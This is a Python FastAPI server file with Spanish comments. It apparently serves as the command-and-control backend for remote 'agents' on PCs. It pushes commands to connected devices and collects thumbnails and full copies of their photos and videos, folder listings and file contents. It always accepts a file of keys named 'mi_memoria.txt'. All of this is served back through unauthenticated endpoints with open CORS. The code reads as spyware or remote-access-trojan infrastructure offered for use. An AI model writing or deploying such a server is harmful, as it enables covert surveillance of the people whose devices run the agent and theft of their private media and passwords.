import base64
import json
from fastapi import FastAPI, WebSocket, WebSocketDisconnect, Response, UploadFile, File
from fastapi.middleware.cors import CORSMiddleware
from pydantic import BaseModel
from typing import List, Dict, Any
from urllib.parse import unquote

app = FastAPI(title="Servidor Universal para Agente PC")

# Configuración de CORS para que el Panel de Control no tenga bloqueos
app.add_middleware(
    CORSMiddleware,
    allow_origins=["*"],
    allow_credentials=True,
    allow_methods=["*"],
    allow_headers=["*"],
)

# --- BASES DE DATOS EN MEMORIA ---
connected_agents: Dict[str, Dict[str, Any]] = {}
device_media_cache: Dict[str, Dict[str, Any]] = {}
fetch_status: Dict[str, str] = {}
directory_cache: Dict[str, Dict[str, Any]] = {}
file_content_cache: Dict[str, str] = {}

# --- MODELOS ---
class Command(BaseModel):
    target_id: str
    action: str
    payload: str = ""

# --- ENDPOINTS PRINCIPALES ---

@app.get("/")
async def root():
    return {"status": "online", "message": "Servidor listo para recibir al Agente"}

@app.websocket("/ws/{device_id}/{device_name:path}")
async def websocket_endpoint(websocket: WebSocket, device_id: str, device_name: str):
    await websocket.accept()
    name = unquote(device_name)
    print(f"Agente conectado: {name}")
    connected_agents[device_id] = {"ws": websocket, "name": name}
    try:
        while True:
            await websocket.receive_text()
    except WebSocketDisconnect:
        if device_id in connected_agents: del connected_agents[device_id]

# Esta es la ruta que daba error 404 en tu panel
@app.get("/api/get-agents")
async def get_agents():
    return [{"id": d_id, "name": data["name"]} for d_id, data in connected_agents.items()]

@app.post("/api/send-command")
async def send_command_to_agent(command: Command):
    agent = connected_agents.get(command.target_id)
    if not agent: return {"status": "error", "message": "Agente desconectado"}
    
    # Limpiar caché si vamos a escanear de nuevo
    if command.action == "get_thumbnails":
        device_media_cache[command.target_id] = {}
        fetch_status[command.target_id] = "loading"
        
    try:
        await agent["ws"].send_text(command.json())
        return {"status": "success"}
    except Exception as e:
        return {"status": "error", "message": str(e)}

# --- RECEPCIÓN DE DATOS (FOTOS, VIDEOS, RUTAS) ---

@app.post("/api/submit_media_chunk/{device_id}")
async def submit_media_chunk(device_id: str, payload: dict):
    """Esta ruta es flexible para que el agente no falle al enviar datos extra como filepath"""
    if device_id not in device_media_cache:
        device_media_cache[device_id] = {}
    
    thumbnails = payload.get("thumbnails", [])
    for thumb in thumbnails:
        filename = thumb.get("filename")
        if filename:
            # Guardamos todo lo que envíe el agente sin preguntar
            device_media_cache[device_id][filename] = thumb
    
    if payload.get("is_final_chunk"):
        fetch_status[device_id] = "complete"
    
    return {"status": "ok"}

@app.get("/api/get_media_list/{device_id}")
async def get_media_list(device_id: str):
    return {
        "status": fetch_status.get(device_id, "complete"),
        "thumbnails": device_media_cache.get(device_id, {})
    }

# --- VISUALIZACIÓN MAXIMIZADA Y CLAVES ---

@app.post("/api/upload_original_file/{device_id}/{filename:path}")
async def upload_original_file(device_id: str, filename: str, file: UploadFile = File(...)):
    name = unquote(filename)
    if device_id not in device_media_cache: device_media_cache[device_id] = {}
    
    # Excepción para que siempre acepte el archivo de claves
    if name == "mi_memoria.txt" or name not in device_media_cache[device_id]:
        device_media_cache[device_id][name] = {"filename": name}
    
    file_bytes = await file.read()
    device_media_cache[device_id][name]['original_b64'] = base64.b64encode(file_bytes).decode('utf-8')
    return {"status": "success"}

@app.get("/media/{device_id}/{filename:path}")
async def get_large_media(device_id: str, filename: str):
    name = unquote(filename)
    item = device_media_cache.get(device_id, {}).get(name)
    
    if not item or 'original_b64' not in item:
        return Response(content='{"detail":"Archivo no listo"}', status_code=404)
    
    file_bytes = base64.b64decode(item['original_b64'])
    fn = name.lower()
    
    # Determinar tipo de archivo para el navegador
    if fn.endswith(('.jpg', '.jpeg')): m_type = "image/jpeg"
    elif fn.endswith('.png'): m_type = "image/png"
    elif fn.endswith(('.mp4', '.mkv', '.avi', '.mov')): m_type = "video/mp4"
    elif fn.endswith(('.txt', '.dat')): m_type = "text/plain; charset=utf-8"
    else: m_type = "application/octet-stream"
    
    return Response(content=file_bytes, media_type=m_type)

# --- EXPLORADOR DE CARPETAS ---

@app.post("/api/submit_directory_listing/{device_id}")
async def submit_directory_listing(device_id: str, listing: dict):
    directory_cache[device_id] = listing
    return {"status": "ok"}

@app.get("/api/get_directory_listing/{device_id}")
async def get_directory_listing(device_id: str):
    return directory_cache.get(device_id, {"current_path": "Raíz", "folders": [], "files": []})

@app.post("/api/submit_file_content/{device_id}")
async def submit_file_content(device_id: str, data: dict):
    file_content_cache[device_id] = data.get("content", "")
    return {"status": "ok"}

@app.get("/view_text/{device_id}")
async def view_text(device_id: str):
    return Response(content=file_content_cache.get(device_id, ""), media_type="text/plain; charset=utf-8")
